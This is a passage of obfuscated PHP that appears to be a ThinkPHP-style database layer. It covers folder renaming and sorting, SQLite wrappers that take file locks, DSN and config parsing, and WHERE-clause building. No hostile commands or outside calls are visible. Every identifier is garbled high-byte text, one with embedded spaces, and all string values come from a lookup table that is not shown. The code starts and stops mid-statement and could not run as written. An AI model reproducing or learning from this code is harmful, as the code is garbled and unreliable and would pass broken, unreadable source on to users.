$âÄ†àˆÔ = array($×…°°û»[1654] => USER_ID, $×…°°û»[420] => $¢ÃÒ¶öÆ, $×…°°û»[483] => 0); return $this->where($âÄ†àˆÔ)->delete(); } protected function rename($âÅÂ¹, $öá‘Û») { $»Êˆ¨Ëé =& $_SERVER[­á Ş³Ö]; if ($âÅÂ¹ == $öá‘Û») { return !1; } $²æúæ™ = $this->getAutoName($öá‘Û»); if ($öá‘Û» != $²æúæ™) { return !1; } $“úœ´¿ã = array($»Êˆ¨Ëé[1654] => USER_ID, $»Êˆ¨Ëé[483] => 0, $»Êˆ¨Ëé[32] => $âÅÂ¹); return $this->where($“úœ´¿ã)->save(array($»Êˆ¨Ëé[32] => $öá‘Û»)); } protected function resetSort($ÔæıàÇ) { $¥ŠÅ‰æ¼ =& $_SERVER[­á Ş³Ö]; $ÔæıàÇ = is_array($ÔæıàÇ) ? $ÔæıàÇ : array(); $Ôâş–ï‰ = array($¥ŠÅ‰æ¼[1654] => USER_ID); for ($ûªŠü…ß = 0; $ûªŠü…ß < count($ÔæıàÇ); $ûªŠü…ß++) { $Ôâş–ï‰[$¥ŠÅ‰æ¼[419]] = $ÔæıàÇ[$ûªŠü…ß]; $this->where($Ôâş–ï‰)->save(array($¥ŠÅ‰æ¼[1856] => $ûªŠü…ß + 1)); } return !0; } protected function moveTop($È‘Ç­Ş) { $‚˜â¦ãĞ =& $_SERVER[­á Ş³Ö]; $Ã°š‚Ó¿ = array($‚˜â¦ãĞ[1654] => USER_ID, $‚˜â¦ãĞ[483] => 0); $îŸµıª¡ = $this->where($Ã°š‚Ó¿)->where(array($‚˜â¦ãĞ[32] => $È‘Ç­Ş))->find(); if (!$îŸµıª¡) { return; } $Ğ©œßöÜ = $this->field($‚˜â¦ãĞ[399])->where($Ã°š‚Ó¿)->order($‚˜â¦ãĞ[2299])->select(); $Ğ©œßöÜ = array_to_keyvalue($Ğ©œßöÜ, $‚˜â¦ãĞ[12], $‚˜â¦ãĞ[399]); $â•Ã¢º = $Ğ©œßöÜ; $Ğ©œßöÜ = array_remove_value($Ğ©œßöÜ, $îŸµıª¡[$‚˜â¦ãĞ[399]]); array_unshift($Ğ©œßöÜ, $îŸµıª¡[$‚˜â¦ãĞ[399]]); return $this->resetSort($Ğ©œßöÜ); } protected function moveBottom($ä× ÛÛ) { $¢…ªçÖ¬ =& $_SERVER[­á Ş³Ö]; $×÷©ü–î = array($¢…ªçÖ¬[1654] => USER_ID, $¢…ªçÖ¬[483] => 0); $ü°Âô’Î = $this->where($×÷©ü–î)->max($¢…ªçÖ¬[1876]); $ë—ÇÌú’ = array($¢…ªçÖ¬[1876] => $ü°Âô’Î + 1); return $this->where($×÷©ü–î)->where(array($¢…ªçÖ¬[32] => $ä× ÛÛ))->save($ë—ÇÌú’); } private function getAutoName($¹ëŠ†») { $¢³õÌÈ˜ =& $_SERVER[­á Ş³Ö]; $Šå”×â” = array($¢³õÌÈ˜[1654] => USER_ID, $¢³õÌÈ˜[483] => 0); $÷Ä‘·Í = $this->field($¢³õÌÈ˜[32])->where($Šå”×â”)->select(); $÷Ä‘·Í = array_to_keyvalue($÷Ä‘·Í, $¢³õÌÈ˜[12], $¢³õÌÈ˜[32]); if (!$÷Ä‘·Í || !in_array($¹ëŠ†», $÷Ä‘·Í)) { return $¹ëŠ†»; } for ($’¨¾ğŒè = 0; $’¨¾ğŒè < count($÷Ä‘·Í); $’¨¾ğŒè++) { if (!in_array($¹ëŠ†» . "\50{$’¨¾ğŒè}\x29", $÷Ä‘·Í)) { return $¹ëŠ†» . "\50{$’¨¾ğŒè}\x29"; } } return $¹ëŠ†» . "\50{$’¨¾ğŒè}\x29"; } } goto f¨­öí‡Öİ; bÏ­’¤®Œƒ: class DbSqlite extends DbSqliteBase { public function query($ûáêü›¾) { $‚ŞÈäú† =& $_SERVER[­á Ş³Ö]; if (!CacheLock::fileLock($‚ŞÈäú†[13])) { return !1; } $šª½å¨Ú = parent::query($ûáêü›¾); CacheLock::fileUnLock($‚ŞÈäú†[13]); return $šª½å¨Ú; } public function execute($å»¼ÈùŒ) { $¯¥…‡Ø¸ =& $_SERVER[­á Ş³Ö]; if (!CacheLock::fileLock($¯¥…‡Ø¸[13])) { return !1; } $ÂñÌ½ = parent::execute($å»¼ÈùŒ); CacheLock::fileUnLock($¯¥…‡Ø¸[13]); return $ÂñÌ½; } } class DbSqlite3 extends DbSqlite3Base { public function query($şê£•›‹) { $Œƒ ì  =& $_SERVER[­á Ş³Ö]; if (!CacheLock::fileLock($Œƒ ì [13])) { return !1; } $úğª£ë¼ = parent::query($şê£•›‹); CacheLock::fileUnLock($Œƒ ì [13]); return $úğª£ë¼; } public function execute($·¢İã’±) { $¿Ö˜æÆ” =& $_SERVER[­á Ş³Ö]; if (!CacheLock::fileLock($¿Ö˜æÆ”[13])) { return !1; } $±‘ô¨Í³ = parent::execute($·¢İã’±); CacheLock::fileUnLock($¿Ö˜æÆ”[13]); return $±‘ô¨Í³; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\161" => "\x3c\x3e", "\147\x74" => "\x3e", "\x65\x67\x74" => "\76\75", "\x6c\164" => "\x3c", "\145\x6c\164" => "\74\x3d", "\156\x6f\164\x6c\151\x6b\x65" => "\116\x4f\x54\40\x4c\111\x4b\x45", "\154\151\153\x65" => "\114\111\113\x45", "\x69\x6e" => "\x49\x4e", "\156\x6f\164\x69\156" => "\116\117\x54\40\111\116", "\156\157\164\40\151\x6e" => "\x4e\117\x54\x20\x49\x4e", "\142\145\164\167\145\145\156" => "\102\x45\x54\x57\105\x45\116", "\x6e\x6f\164\x62\x65\x74\x77\x65\145\x6e" => "\116\117\x54\40\102\105\124\127\x45\105\116", "\x6e\x6f\x74\x20\x62\145\164\x77\145\145\x6e" => "\x4e\x4f\x54\40\x42\105\124\x57\x45\105\x4e"); protected $selectSql = "\123\105\114\105\103\x54\x25\x44\x49\123\x54\111\x4e\103\124\x25\40\45\x46\111\105\x4c\104\45\40\x46\122\117\115\40\45\x54\101\102\114\x45\45\45\112\x4f\111\116\45\x25\x57\110\x45\122\105\45\x25\x47\122\117\x55\120\45\x25\x48\101\x56\111\x4e\107\45\x25\x4f\122\104\105\x52\45\45\114\111\x4d\111\x54\x25\x20\45\125\116\x49\117\116\x25\x25\x43\117\115\x4d\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $Öü÷ä§ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[­á Ş³Ö][956], $Öü÷ä§); } public function factory($ª›æ‡Í = '') { $Ê‚å§• =& $_SERVER[­á Ş³Ö]; $ª›æ‡Í = $this->parseConfig($ª›æ‡Í); if (empty($ª›æ‡Í[$Ê‚å§•[957]])) { think_exception(think_lang($Ê‚å§•[958])); } $this->dbType = ucwords(strtolower($ª›æ‡Í[$Ê‚å§•[957]])); $ÅäÊÊÆ = $Ê‚å§•[959] . $this->dbType; if (class_exists($ÅäÊÊÆ)) { $õöŒäÒ• = new $ÅäÊÊÆ($ª›æ‡Í); if ($Ê‚å§•[960] != strtolower($ª›æ‡Í[$Ê‚å§•[957]])) { $õöŒäÒ•->dbType = strtoupper($this->dbType); } else { $õöŒäÒ•->dbType = $this->_getDsnType($ª›æ‡Í[$Ê‚å§•[912]]); } } else { think_exception(think_lang($Ê‚å§•[961]) . $Ê‚å§•[962] . $ÅäÊÊÆ); } return $õöŒäÒ•; } public function __call($»¡óúç, $ÆÈ¥Ä•) { if (method_exists($this, $»¡óúç)) { return call_user_func_array(array($this, $»¡óúç), $ÆÈ¥Ä•); } } protected function _getDsnType($õÓš±á’) { $¹¿½¹Ü¾ = explode($_SERVER[­á Ş³Ö][4], $õÓš±á’); $Ç²×ÛÒ‡ = strtoupper(trim($¹¿½¹Ü¾[0])); return $Ç²×ÛÒ‡; } private function parseConfig($ØúøÄ = '') { $“ñ•¬á¶ =& $_SERVER[­á Ş³Ö]; if (!empty($ØúøÄ) && is_string($ØúøÄ)) { $ØúøÄ = $this->parseDSN($ØúøÄ); } elseif (is_array($ØúøÄ)) { $ØúøÄ = array_change_key_case($ØúøÄ); $ØúøÄ = array($“ñ•¬á¶[957] => $ØúøÄ[$“ñ•¬á¶[963]], $“ñ•¬á¶[884] => $ØúøÄ[$“ñ•¬á¶[964]], $“ñ•¬á¶[885] => $ØúøÄ[$“ñ•¬á¶[965]], $“ñ•¬á¶[882] => $ØúøÄ[$“ñ•¬á¶[966]], $“ñ•¬á¶[883] => $ØúøÄ[$“ñ•¬á¶[967]], $“ñ•¬á¶[21] => $ØúøÄ[$“ñ•¬á¶[968]], $“ñ•¬á¶[912] => $ØúøÄ[$“ñ•¬á¶[969]], $“ñ•¬á¶[17] => isset($ØúøÄ[$“ñ•¬á¶[970]]) ? $ØúøÄ[$“ñ•¬á¶[970]] : array()); } elseif (empty($ØúøÄ)) { if (think_config($“ñ•¬á¶[971]) && $“ñ•¬á¶[960] != strtolower(think_config($“ñ•¬á¶[972]))) { $ØúøÄ = $this->parseDSN(think_config($“ñ•¬á¶[971])); } else { $ØúøÄ = array($“ñ•¬á¶[957] => think_config($“ñ•¬á¶[972]), $“ñ•¬á¶[884] => think_config($“ñ•¬á¶[973]), $“ñ•¬á¶[885] => think_config($“ñ•¬á¶[974]), $“ñ•¬á¶[882] => think_config($“ñ•¬á¶[975]), $“ñ•¬á¶[883] => think_config($“ñ•¬á¶[976]), $“ñ•¬á¶[21] => think_config($“ñ•¬á¶[246]), $“ñ•¬á¶[912] => think_config($“ñ•¬á¶[971]), $“ñ•¬á¶[17] => think_config($“ñ•¬á¶[977])); } } return $ØúøÄ; } protected function initConnect($Ø›ûÈ¥ = true) { if (1 == think_config($_SERVER[­á Ş³Ö][22])) { $this->_linkID = $this->multiConnect($Ø›ûÈ¥); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $‰äÏ—åµ => $™ñÔÃ­Ú) { $this->_linkID = $™ñÔÃ­Ú; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($òˆ—“ú† = false) { $àªÚµ–º =& $_SERVER[­á Ş³Ö]; static $‹ç£Â = array(); static $Â¡Ï™… = -1; if (empty($‹ç£Â)) { foreach ($this->config as $•åæ¾ => $³¥òğ) { $‹ç£Â[$•åæ¾] = explode($àªÚµ–º[50], $³¥òğ); } } if (think_config($àªÚµ–º[978])) { if ($òˆ—“ú† || think_config($àªÚµ–º[395]) === !0) { $ÇÒ¨ëòº = floor(mt_rand(0, think_config($àªÚµ–º[979]) - 1)); $Â¡Ï™… = $ÇÒ¨ëòº; } else { if (is_numeric(think_config($àªÚµ–º[980]))) { $ÇÒ¨ëòº = think_config($àªÚµ–º[980]); } else { $ÇÒ¨ëòº = floor(mt_rand(think_config($àªÚµ–º[979]), count($‹ç£Â[$àªÚµ–º[882]]) - 1)); } } } else { $ÇÒ¨ëòº = floor(mt_rand(0, count($‹ç£Â[$àªÚµ–º[882]]) - 1)); $Â¡Ï™… = $ÇÒ¨ëòº; } $ÇÒ¨ëòº = $Â¡Ï™… !== -1 ? $Â¡Ï™… : $ÇÒ¨ëòº; $æŠÑ¨Ì = array($àªÚµ–º[884] => isset($‹ç£Â[$àªÚµ–º[884]][$ÇÒ¨ëòº]) ? $‹ç£Â[$àªÚµ–º[884]][$ÇÒ¨ëòº] : $‹ç£Â[$àªÚµ–º[884]][0], $àªÚµ–º[885] => isset($‹ç£Â[$àªÚµ–º[885]][$ÇÒ¨ëòº]) ? $‹ç£Â[$àªÚµ–º[885]][$ÇÒ¨ëòº] : $‹ç£Â[$àªÚµ–º[885]][0], $àªÚµ–º[882] => isset($‹ç£Â[$àªÚµ–º[882]][$ÇÒ¨ëòº]) ? $‹ç£Â[$àªÚµ–º[882]][$ÇÒ¨ëòº] : $‹ç£Â[$àªÚµ–º[882]][0], $àªÚµ–º[883] => isset($‹ç£Â[$àªÚµ–º[883]][$ÇÒ¨ëòº]) ? $‹ç£Â[$àªÚµ–º[883]][$ÇÒ¨ëòº] : $‹ç£Â[$àªÚµ–º[883]][0], $àªÚµ–º[21] => isset($‹ç£Â[$àªÚµ–º[21]][$ÇÒ¨ëòº]) ? $‹ç£Â[$àªÚµ–º[21]][$ÇÒ¨ëòº] : $‹ç£Â[$àªÚµ–º[21]][0], $àªÚµ–º[912] => isset($‹ç£Â[$àªÚµ–º[912]][$ÇÒ¨ëòº]) ? $‹ç£Â[$àªÚµ–º[912]][$ÇÒ¨ëòº] : $‹ç£Â[$àªÚµ–º[912]][0], $àªÚµ–º[17] => isset($‹ç£Â[$àªÚµ–º[17]][$ÇÒ¨ëòº]) ? $‹ç£Â[$àªÚµ–º[17]][$ÇÒ¨ëòº] : $‹ç£Â[$àªÚµ–º[17]][0]); return $this->connect($æŠÑ¨Ì, $ÇÒ¨ëòº); } public function parseDSN($Âˆú¿Ì¿) { $ÑËëÇ«ú =& $_SERVER[­á Ş³Ö]; if (empty($Âˆú¿Ì¿)) { return !1; } $ĞŞÆÏü’ = parse_url($Âˆú¿Ì¿); if ($ĞŞÆÏü’[$ÑËëÇ«ú[181]]) { $ÂßĞ˜ïú = array($ÑËëÇ«ú[957] => $ĞŞÆÏü’[$ÑËëÇ«ú[181]], $ÑËëÇ«ú[884] => isset($ĞŞÆÏü’[$ÑËëÇ«ú[590]]) ? $ĞŞÆÏü’[$ÑËëÇ«ú[590]] : $ÑËëÇ«ú[12], $ÑËëÇ«ú[885] => isset($ĞŞÆÏü’[$ÑËëÇ«ú[981]]) ? $ĞŞÆÏü’[$ÑËëÇ«ú[981]] : $ÑËëÇ«ú[12], $ÑËëÇ«ú[882] => isset($ĞŞÆÏü’[$ÑËëÇ«ú[182]]) ? $ĞŞÆÏü’[$ÑËëÇ«ú[182]] : $ÑËëÇ«ú[12], $ÑËëÇ«ú[883] => isset($ĞŞÆÏü’[$ÑËëÇ«ú[183]]) ? $ĞŞÆÏü’[$ÑËëÇ«ú[183]] : $ÑËëÇ«ú[12], $ÑËëÇ«ú[21] => isset($ĞŞÆÏü’[$ÑËëÇ«ú[84]]) ? substr($ĞŞÆÏü’[$ÑËëÇ«ú[84]], 1) : $ÑËëÇ«ú[12]); } else { preg_match($ÑËëÇ«ú[982], trim($Âˆú¿Ì¿), $„Ëõ”¿º); $ÂßĞ˜ïú = array($ÑËëÇ«ú[957] => $„Ëõ”¿º[1], $ÑËëÇ«ú[884] => $„Ëõ”¿º[2], $ÑËëÇ«ú[885] => $„Ëõ”¿º[3], $ÑËëÇ«ú[882] => $„Ëõ”¿º[4], $ÑËëÇ«ú[883] => $„Ëõ”¿º[5], $ÑËëÇ«ú[21] => $„Ëõ”¿º[6]); } $ÂßĞ˜ïú[$ÑËëÇ«ú[912]] = $ÑËëÇ«ú[12]; return $ÂßĞ˜ïú; } protected function debug() { $Éú¸£ ¥ =& $_SERVER[­á Ş³Ö]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Éú¸£ ¥[983]; if (think_config($Éú¸£ ¥[984])) { think_status($Éú¸£ ¥[985]); think_trace($this->queryStr . $Éú¸£ ¥[986] . think_status($Éú¸£ ¥[24], $Éú¸£ ¥[985], 6) . $Éú¸£ ¥[987], $Éú¸£ ¥[12], $Éú¸£ ¥[988]); } } protected function parseLock($ƒúá•àø = false) { $µ€¡‚âè =& $_SERVER[­á Ş³Ö]; if (!$ƒúá•àø) { return $µ€¡‚âè[12]; } if ($µ€¡‚âè[914] == $this->dbType) { return $µ€¡‚âè[989]; } return $µ€¡‚âè[990]; } protected function parseSet($âËìÁÍ˜) { $Õ·öàñí =& $_SERVER[­á Ş³Ö]; foreach ($âËìÁÍ˜ as $åÁ˜Âõù => $çêìäı) { if (is_array($çêìäı) && $Õ·öàñí[297] == $çêìäı[0]) { $—ˆ—ÊŠ¶[] = $this->parseKey($åÁ˜Âõù) . $Õ·öàñí[880] . $çêìäı[1]; } elseif (is_scalar($çêìäı) || is_null($çêìäı)) { $—ˆ—ÊŠ¶[] = $this->parseKey($åÁ˜Âõù) . $Õ·öàñí[880] . $this->parseValue($çêìäı); } } return $Õ·öàñí[991] . implode($Õ·öàñí[50], $—ˆ—ÊŠ¶); } protected function bindParam($¨Êª™, $‡¡âªÊ) { $this->bind[$_SERVER[­á Ş³Ö][4] . $¨Êª™] = $‡¡âªÊ; } protected function parseBind($Â½àÓšğ) { $Â½àÓšğ = array_merge($this->bind, $Â½àÓšğ); $this->bind = array(); return $Â½àÓšğ; } function parseKey(&$†·Ğ½Ì¿, $Ò’Ö½äÅ = true) { if ($Ò’Ö½äÅ) { $†·Ğ½Ì¿ = $this->parseKeyCheck($†·Ğ½Ì¿); } return $†·Ğ½Ì¿; } function parseKeyCheck($ÇÆ±İÜ™) { $çô£¹±¾ =& $_SERVER[­á Ş³Ö]; $ÇÆ±İÜ™ = trim($ÇÆ±İÜ™); if (!preg_match($çô£¹±¾[992], $ÇÆ±İÜ™)) { think_exception($çô£¹±¾[993] . $ÇÆ±İÜ™); } return $ÇÆ±İÜ™; } protected function parseValue($‡¨›¿Õ¥) { $Ä¬–ıß =& $_SERVER[­á Ş³Ö]; if (is_string($‡¨›¿Õ¥)) { $‡¨›¿Õ¥ = $Ä¬–ıß[953] . $this->escapeString($‡¨›¿Õ¥) . $Ä¬–ıß[953]; } elseif (isset($‡¨›¿Õ¥[0]) && is_string($‡¨›¿Õ¥[0]) && strtolower($‡¨›¿Õ¥[0]) == $Ä¬–ıß[297]) { $‡¨›¿Õ¥ = $this->escapeString($‡¨›¿Õ¥[1]); } elseif (is_array($‡¨›¿Õ¥)) { $‡¨›¿Õ¥ = array_map(array($this, $Ä¬–ıß[954]), $‡¨›¿Õ¥); } elseif (is_bool($‡¨›¿Õ¥)) { $‡¨›¿Õ¥ = $‡¨›¿Õ¥ ? $Ä¬–ıß[88] : $Ä¬–ıß[198]; } elseif (is_null($‡¨›¿Õ¥)) { $‡¨›¿Õ¥ = $Ä¬–ıß[103]; } return $‡¨›¿Õ¥; } protected function parseField($²ŠÛğ¦è) { $¿ÒêØ =& $_SERVER[­á Ş³Ö]; if (is_string($²ŠÛğ¦è) && strpos($²ŠÛğ¦è, $¿ÒêØ[50])) { $²ŠÛğ¦è = explode($¿ÒêØ[50], $²ŠÛğ¦è); } if (is_array($²ŠÛğ¦è)) { $Ø×»áÁ = array(); foreach ($²ŠÛğ¦è as $ˆğÌò«­ => $…’Š³øæ) { if (!is_numeric($ˆğÌò«­)) { $Ø×»áÁ[] = $this->parseKey($ˆğÌò«­, !1) . $¿ÒêØ[994] . $this->parseKey($…’Š³øæ); } else { $Ø×»áÁ[] = $this->parseKey($…’Š³øæ); } } $ıˆ‰ƒ¸ = implode($¿ÒêØ[50], $Ø×»áÁ); } elseif (is_string($²ŠÛğ¦è) && !empty($²ŠÛğ¦è)) { $ıˆ‰ƒ¸ = $²ŠÛğ¦è; } else { $ıˆ‰ƒ¸ = $¿ÒêØ[189]; } return $ıˆ‰ƒ¸; } protected function parseTable($Ä×îÓüÄ) { $İêˆëÆ =& $_SERVER[­á Ş³Ö]; if (is_array($Ä×îÓüÄ)) { $¡ğà“³ = array(); foreach ($Ä×îÓüÄ as $Ÿ¯®ÂÁ¯ => $–ÇÄò¯») { if (!is_numeric($Ÿ¯®ÂÁ¯)) { $¡ğà“³[] = $this->parseKey($Ÿ¯®ÂÁ¯) . $İêˆëÆ[53] . $this->parseKey($–ÇÄò¯»); } else { $¡ğà“³[] = $this->parseKey($Ÿ¯®ÂÁ¯); } } $Ä×îÓüÄ = $¡ğà“³; } elseif (is_string($Ä×îÓüÄ)) { if (strstr($Ä×îÓüÄ, $İêˆëÆ[53])) { return $Ä×îÓüÄ; } $Ä×îÓüÄ = explode($İêˆëÆ[50], $Ä×îÓüÄ); array_walk($Ä×îÓüÄ, array($this, $İêˆëÆ[902])); } return $İêˆëÆ[896] . trim(implode($İêˆëÆ[995], $Ä×îÓüÄ), $İêˆëÆ[385]) . $İêˆëÆ[896]; } protected function parseWhere($‹«½ÑÁ) { $î½Ê¤ú« =& $_SERVER[­á Ş³Ö]; $ÖíœĞ½¥ = $î½Ê¤ú«[12]; if (is_string($‹«½ÑÁ)) { $ÖíœĞ½¥ = $‹«½ÑÁ; } else { $œ§´‘ = isset($‹«½ÑÁ[$î½Ê¤ú«[996]]) ? strtoupper($‹«½ÑÁ[$î½Ê¤ú«[996]]) : $î½Ê¤ú«[12]; if (in_array($œ§´‘, array($î½Ê¤ú«[997], $î½Ê¤ú«[998], $î½Ê¤ú«[999]))) { $œ§´‘ = $î½Ê¤ú«[53] . $œ§´‘ . $î½Ê¤ú«[53]; unset($‹«½ÑÁ[$î½Ê¤ú«[996]]); } else { $œ§´‘ = $î½Ê¤ú«[1000]; } foreach ($‹«½ÑÁ as $ì×‡Ìåâ => $õ‡Íû–ö) { $ÖíœĞ½¥ .= $î½Ê¤ú«[277]; if (is_numeric($ì×‡Ìåâ)) { $ì×‡Ìåâ = $î½Ê¤ú«[1001]; } if (0 === strpos($ì×‡Ìåâ, $î½Ê¤ú«[11])) { $ÖíœĞ½¥ .= $this->parseThinkWhere($ì×‡Ìåâ, $õ‡Íû–ö); } else { if (!preg_match($î½Ê¤ú«[1002], trim($ì×‡Ìåâ))) { think_exception(think_lang($î½Ê¤ú«[1003]) . $î½Ê¤ú«[4] . $ì×‡Ìåâ); } $ğ¶€†·­ = is_array($õ‡Íû–ö) && isset($õ‡Íû–ö[$î½Ê¤ú«[1004]]); $ì×‡Ìåâ = trim($ì×‡Ìåâ); if (strpos($ì×‡Ìåâ, $î½Ê¤ú«[283])) { $Ò¼‘¡¸Œ = explode($î½Ê¤ú«[283], $ì×‡Ìåâ); $áÉ´çé¢ = array(); foreach ($Ò¼‘¡¸Œ as $‘â•±§È => $œ×Ëâƒã) { $ÕìÃä» = $ğ¶€†·­ ? $õ‡Íû–ö[$‘â•±§È] : $õ‡Íû–ö; $áÉ´çé¢[] = $î½Ê¤ú«[260] . $this->parseWhereItem($this->parseKey($œ×Ëâƒã), $ÕìÃä») . $î½Ê¤ú«[901]; } $ÖíœĞ½¥ .= implode($î½Ê¤ú«[1005], $áÉ´çé¢); } elseif (strpos($ì×‡Ìåâ, $î½Ê¤ú«[284])) { $Ò¼‘¡¸Œ = explode($î½Ê¤ú«[284], $ì×‡Ìåâ); $áÉ´çé¢ = array(); foreach ($Ò¼‘¡¸Œ as $‘â•±§È => $œ×Ëâƒã) { $ÕìÃä» = $ğ¶€†·­ ? $õ‡Íû–ö[$‘â•±§È] : $õ‡Íû–ö; $áÉ´çé¢[] = $î½Ê¤ú«[260] . $this->parseWhereItem($this->parseKey($œ×Ëâƒã), $ÕìÃä») . $î½Ê¤ú«[901]; } $ÖíœĞ½¥ .= implode($î½Ê¤ú«[1000], $áÉ´çé¢); } else { $ÖíœĞ½¥ .= $this->parseWhereItem($this->parseKey($ì×‡Ìåâ), $õ‡Íû–ö); } } $ÖíœĞ½¥ .= $î½Ê¤ú«[278] . $œ§´‘; } $ÖíœĞ½¥ = substr($ÖíœĞ½¥, 0, -strlen($œ§´‘)); } return empty($ÖíœĞ½¥) ? $î½Ê¤ú«[12] : $î½Ê¤ú«[1006] . $ÖíœĞ½¥; } protected function parseWhereItem($¸¥Üéû, $÷À‡á¢) { $öê»Êµà =& $_SERVER[­á Ş³Ö]; $Àœì’÷‡ = $öê»Êµà[12]; if (is_array($÷À‡á¢)) { if (is_string($÷À‡á¢[0])) { $«Ğ¡Ìœ­ = strtolower($÷À‡á¢[0]); if (in_array($÷À‡á¢[0], array($öê»Êµà[880], $öê»Êµà[1007], $öê»Êµà[1008], $öê»Êµà[1009], $öê»Êµà[1010], $öê»Êµà[1011]))) { $Àœì’÷‡ .= $¸¥Üéû . $öê»Êµà[53] . $÷À‡á¢[0] . $öê»Êµà[53] . $this->parseValue($÷À‡á¢[1]); } elseif (preg_match($öê»Êµà[1012], $÷À‡á¢[0])) { $Àœì’÷‡ .= $¸¥Üéû . $öê»Êµà[53] . $this->exp[$«Ğ¡Ìœ­] . $öê»Êµà[53] . $this->parseValue($÷À‡á¢[1]); } elseif (preg_match($öê»Êµà[1013], $÷À‡á¢[0])) { if (is_array($÷À‡á¢[1])) { $›™ÃÏ®ì = isset($÷À‡á¢[2]) ? strtoupper($÷À‡á¢[2]) : $öê»Êµà[998]; if (in_array($›™ÃÏ®ì, array($öê»Êµà[997], $öê»Êµà[998], $öê»Êµà[999]))) { $åÍæ¤‚ó = array(); foreach ($÷À‡á¢[1] as $Œ’´ì‘Á) { $åÍæ¤‚ó[] = $¸¥Üéû . $öê»Êµà[53] . $this->exp[$«Ğ¡Ìœ­] . $öê»Êµà[53] . $this->parseValue($Œ’´ì‘Á); } $Àœì’÷‡ .= $öê»Êµà[260] . implode($öê»Êµà[53] . $›™ÃÏ®ì . $öê»Êµà[53], $åÍæ¤‚ó) . $öê»Êµà[901]; } } else { $Àœì’÷‡ .= $¸¥Üéû . $öê»Êµà[53] . $this->exp[$«Ğ¡Ìœ­] . $öê»Êµà[53] . $this->parseValue($÷À‡á¢[1]); } } elseif ($öê»Êµà[297] == $«Ğ¡Ìœ­) { $Àœì’÷‡ .= $öê»Êµà[899] . $¸¥Üéû . $öê»Êµà[53] . $÷À‡á¢[1] . $öê»Êµà[1014]; } elseif (preg_match($öê»Êµà[1015], $÷À‡á¢[0])) { $Àœì’÷‡ .= $÷À‡á¢[0]; } elseif (preg_match($öê»Êµà[1016], $÷À‡á¢[0])) { if (isset($÷À‡á¢[2]) && $öê»Êµà[297] == $÷À‡á¢[2]) { $Àœì’÷‡ .= $¸¥Üéû . $öê»Êµà[53] . $this->exp[$«Ğ¡Ìœ­] . $öê»Êµà[53] . $÷À‡á¢[1]; } else { if (is_string($÷À‡á¢[1])) { $÷À‡á¢[1] = explode($öê»Êµà[50], $÷À‡á¢[1]); } $ú¡ã¹Œ = implode($öê»Êµà[50], $this->parseValue($÷À‡á¢[1])); $Àœì’÷‡ .= $¸¥Üéû . $öê»Êµà[53] . $this->exp[$«Ğ¡Ìœ­] . $öê»Êµà[899] . $ú¡ã¹Œ . $öê»Êµà[901]; } } elseif (preg_match($öê»Êµà[1017], $÷À‡á¢[0])) { $éÃ­ç†‰ = is_string($÷À‡á¢[1]) ? explode($öê»Êµà[50], $÷À‡á¢[1]) : $÷À‡á¢[1]; $Àœì’÷‡ .= $öê»Êµà[899] . $¸¥Üéû . $öê»Êµà[53] . $this->exp[$«Ğ¡Ìœ­] . $öê»Êµà[53] . $this->parseValue($éÃ­ç†‰[0]) . $öê»Êµà[1000] . $this->parseValue($éÃ­ç†‰[1]) . $öê»Êµà[278]; } else { think_exception(think_lang($öê»Êµà[1003]) . $öê»Êµà[4] . $÷À‡á¢[0]); } } else { $™úİÉ³¿ = count($÷À‡á¢); $ûõ†€êì = $öê»Êµà[12]; if (is_string($÷À‡á¢[$™úİÉ³¿ - 1])) { $ûõ†€êì = isset($÷À‡á¢[$™úİÉ³¿ - 1]) ? strtoupper($÷À‡á¢[$™úİÉ³¿ - 1]) : $öê»Êµà[12]; if (in_array($ûõ†€êì, array($öê»Êµà[997], $öê»Êµà[998], $öê»Êµà[999]))) { $™úİÉ³¿ = $™úİÉ³¿ - 1; } } else { $ûõ†€êì = $öê»Êµà[997]; } for ($ÀüØø† = 0; $ÀüØø† < $™úİÉ³¿; $ÀüØø†++) { $éÃ­ç†‰ = is_array($÷À‡á¢[$ÀüØø†]) ? $÷À‡á¢[$ÀüØø†][1] : $÷À‡á¢[$ÀüØø†]; if ($öê»Êµà[297] == strtolower($÷À‡á¢[$ÀüØø†][0])) { $Àœì’÷‡ .= $öê»Êµà[260] . $¸¥Üéû . $öê»Êµà[53] . $éÃ­ç†‰ . $öê»Êµà[1014] . $ûõ†€êì . $öê»Êµà[53]; } else { $ŠôËÜªÃ = is_array($÷À‡á¢[$ÀüØø†]) ? $this->exp[strtolower($÷À‡á¢[$ÀüØø†][0])] : $öê»Êµà[880]; if (!$ŠôËÜªÃ && is_array($÷À‡á¢[$ÀüØø†]) && in_array($÷À‡á¢[$ÀüØø†][0], array($öê»Êµà[880], $öê»Êµà[1007], $öê»Êµà[1008], $öê»Êµà[1009], $öê»Êµà[1010], $öê»Êµà[1011]))) { $ŠôËÜªÃ = $÷À‡á¢[$ÀüØø†][0]; } $Àœì’÷‡ .= $öê»Êµà[260] . $¸¥Üéû . $öê»Êµà[53] . $ŠôËÜªÃ . $öê»Êµà[53] . $this->parseValue($éÃ­ç†‰) . $öê»Êµà[1014] . $ûõ†€êì . $öê»Êµà[53]; } } $Àœì’÷‡ = substr($Àœì’÷‡, 0, -4); } } else { $Àœì’÷‡ .= $¸¥Üéû . $öê»Êµà[1018] . $this->parseValue($÷À‡á¢); } return $Àœì’÷‡; } protected function parseThinkWhere($à÷‡Èœµ, $ÃõÅ·™Ä) { $ÀüÍÅè… =& $_SERVER[­á Ş³Ö]; $°§å¯éÒ = $ÀüÍÅè…[12]; switch ($à÷‡Èœµ) { case $ÀüÍÅè…[352]: $°§å¯éÒ = $ÃõÅ·™Ä; break; case $ÀüÍÅè…[1001]: $°§å¯éÒ = is_string($ÃõÅ·™Ä) ? $ÃõÅ·™Ä : 